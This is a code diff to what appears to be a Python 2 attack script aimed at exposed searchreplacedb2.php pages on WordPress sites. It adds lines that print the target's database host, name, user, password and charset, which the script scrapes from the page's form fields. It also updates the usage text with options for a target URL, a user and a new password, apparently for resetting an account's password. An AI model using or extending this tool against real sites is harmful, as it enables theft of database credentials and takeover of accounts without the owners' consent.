@@ -66,6 +66,7 @@ class Target(object):
 		self.replace("$$$",self.user)
 
 	def populate(self):
+		good("Getting info at "+self.url)
 		values = {'loadwp':1}
 		data = urllib.urlencode(values)
 		response = ""
@@ -79,14 +80,19 @@ class Target(object):
 		for line in html:
 			if line.find('name="host"') != -1:
 				self.db_host = line.split('"')[9]
+				good("Setting '"+self.db_host+"' as database host")
 			if line.find('name="data"') != -1:
 				self.db_name = line.split('"')[9]
+				good("Setting '"+self.db_name+"' as database name")
 			if line.find('name="user"') != -1:
 				self.db_user = line.split('"')[9]
+				good("Setting '"+self.db_user+"' as database user")
 			if line.find('name="pass"') != -1:
 				self.db_pass = line.split('"')[9]
+				good("Setting '"+self.db_pass+"' as database password")
 			if line.find('name="char"') != -1:
 				self.db_char = line.split('"')[9]
+				good("Setting '"+self.db_char+"' as charset")
 
 	def sanitizeUrl(self,url):
 		if "://" not in url: 
@@ -107,7 +113,7 @@ def info(text):
 	print "[\x1B[33m!\x1B[0m] "+text
 
 def main():
-	parser = optparse.OptionParser("Usage: "+sys.argv[0]+" -t <target_url> -u <user>")
+	parser = optparse.OptionParser("Usage: "+sys.argv[0]+" -t <target_url> [-u <user>] [-p <password>]")
 	parser.add_option('-t',dest='target_url',type='string',help="The target's URL (ex: http://www.exemple.com/searchreplacedb2.php)")
 	parser.add_option('-u',dest='target_user',type='string',help="The target's user you'll use")
 	parser.add_option('-p',dest='target_password',type='string',help="The new password")
